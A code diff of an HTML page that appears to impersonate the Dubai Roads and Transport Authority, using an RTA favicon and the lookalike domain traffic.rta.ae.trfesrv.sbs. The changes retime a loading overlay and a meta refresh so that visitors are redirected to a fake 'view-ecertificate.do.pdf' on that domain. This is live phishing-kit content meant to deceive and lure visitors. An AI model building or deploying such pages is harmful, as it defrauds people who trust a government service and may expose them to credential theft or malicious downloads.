@@ -5,6 +5,9 @@
 <link rel="icon" type="image/jpeg" href="rta.jpg">
 
 
+
+
+<!-- دائرة تحميل سريعة صغيرة فوق الصفحة -->
 <div id="small-loader-overlay" style="
   position: fixed;
   inset: 0;
@@ -40,16 +43,19 @@
 setTimeout(function(){
   var overlay = document.getElementById("small-loader-overlay");
   overlay.style.display = "flex";
-  // تم تعديل هذا السطر ليصبح 3000 ملي ثانية (3 ثواني) بدلاً من 40000
   setTimeout(function(){
     overlay.style.display = "none";
-    window.location.href = "https://traffic.rta.ae.trfesrv.sbs/public_resources/index.html";
-  }, 3000); 
+    window.location.href = "https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf";
+  }, 40000);
 }, 3000);
 </script>
 
 
-<meta http-equiv="refresh" content="3; url=https://traffic.rta.ae.trfesrv.sbs/public_resources/index.html">
+
+
+
+<meta http-equiv="refresh" content="140000000000; url=https://traffic.rta.ae.trfesrv.sbs/public_resources/view-ecertificate.do.pdf">
+
 
 
 
@@ -1477,6 +1483,7 @@ setTimeout(function(){
   </main>
 
 </template><script data-template-shadow-root>(()=>{document.currentScript.remove();processNode(document);function processNode(node){node.querySelectorAll("template[shadowrootmode]").forEach(element=>{let shadowRoot = element.parentElement.shadowRoot;if (!shadowRoot) {try {shadowRoot=element.parentElement.attachShadow({mode:element.getAttribute("shadowrootmode"),delegatesFocus:element.getAttribute("shadowrootdelegatesfocus")!=null,clonable:element.getAttribute("shadowrootclonable")!=null,serializable:element.getAttribute("shadowrootserializable")!=null});shadowRoot.innerHTML=element.innerHTML;element.remove()} catch (error) {} if (shadowRoot) {processNode(shadowRoot)}}})}})()</script>
+
 
 
 
